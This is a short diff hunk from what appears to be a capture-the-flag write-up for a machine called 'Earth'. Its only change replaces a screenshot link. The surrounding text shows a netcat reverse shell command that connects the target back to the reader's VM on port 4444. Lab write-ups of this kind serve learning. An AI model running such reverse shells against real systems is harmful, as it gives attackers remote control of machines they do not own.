@@ -147,7 +147,7 @@ So in the CLI of the Earth machine type in `nc -e /bin/bash 10.38.1.1 4444` But 
 
 `10.38.1.1` is your VM's ip address and if you are not sure of the ip address of the VM you can use `ifconfig` to get it.
 
-<img width="955" height="331" alt="image" src="https://github.com/user-attachments/assets/e47b2fbe-ed82-4b0d-8dd2-e7afb5535549" />
+<img width="704" height="341" alt="image" src="https://github.com/user-attachments/assets/a4782947-2837-417f-a963-5a6b90a47543" />
 
 Upon running the command we can see that the machine forbids remote connections.
 
